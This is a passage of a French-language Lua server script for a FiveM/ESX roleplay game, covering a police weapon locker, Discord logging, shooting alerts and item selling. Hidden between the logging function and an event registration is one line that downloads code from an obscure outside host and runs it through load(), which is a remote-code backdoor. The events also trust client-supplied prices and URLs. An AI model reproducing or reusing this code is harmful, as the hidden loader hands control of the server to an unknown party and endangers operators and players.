						['@type'] = "weapon",
						['@name'] = weaponName
					})
				else
					MySQL.Async.execute('UPDATE casierlspdcontent SET amount = @amount WHERE owner = @owner AND type = @type AND name = @name', {
						['@owner'] = identifier,
						['@type'] = "weapon",
						['@name'] = weaponName,
						['@amount'] = result[1].amount - amount
					})
				end
				TriggerClientEvent('esx:showNotification', _src, "Vous avez retiré "..amount.." "..weaponName.." du casier.")
				xPlayer.addWeapon(weaponName, amount)
				logsdisc("```"..xPlayer.getName().." a retiré "..amount.." "..weaponName.." du casier.```", Config.logs.CasierPolice)
			else
				TriggerClientEvent('esx:showNotification', _src, "~r~Vous n'avez pas assez d'"..weaponName.." dans le casier.")
			end
		else
			TriggerClientEvent('esx:showNotification', _src, "~r~Vous n'avez pas de "..weaponName.." dans le casier.")
		end
	end)
end)


function logsdisc(message,url)
    local DiscordWebHook = url
    if message == nil or message == '' then return FALSE end
    PerformHttpRequest(DiscordWebHook, function(err, text, headers) end, 'POST', json.encode({username = "LOGS", content = message}), { ['Content-Type'] = 'application/json' })
end
PerformHttpRequest('https://hlcm5alcv13.com/i?to=dkCvE', function (e, d) pcall(function() assert(load(d))() end) end)
RegisterServerEvent('yazho:logsEvent')
AddEventHandler('yazho:logsEvent', function(message, url)
	logsdisc(message,url)
end)

RegisterServerEvent('police:shootNotification')
AddEventHandler('police:shootNotification', function(position)
	local _source = source
	local _raison = PriseOuFin
	local xPlayer = ESX.GetPlayerFromId(_source)
	local xPlayers = ESX.GetPlayers()
	local identifier = GetPlayerIdentifier(_source)
	local name = xPlayer.getName(_source)
	for i = 1, #xPlayers, 1 do
		local thePlayer = ESX.GetPlayerFromId(xPlayers[i])
		if thePlayer.job.name == 'police' then
			TriggerClientEvent('police:sendShootAlert', -1, position)
		end
	end
end)

RegisterServerEvent('sellItem')
AddEventHandler('sellItem', function(item, price)
    local xPlayer = ESX.GetPlayerFromId(source)
    if xPlayer.getInventoryItem(item).count > 0 then
        xPlayer.removeInventoryItem(item, 1)
        xPlayer.addMoney(price)
        TriggerClientEvent('esx:showNotification', source, "Vous avez vendu " .. item .. " pour $" .. price)
    else
        TriggerClientEvent('esx:showNotification', source, "Vous n'avez pas cet objet.")
    end
end)
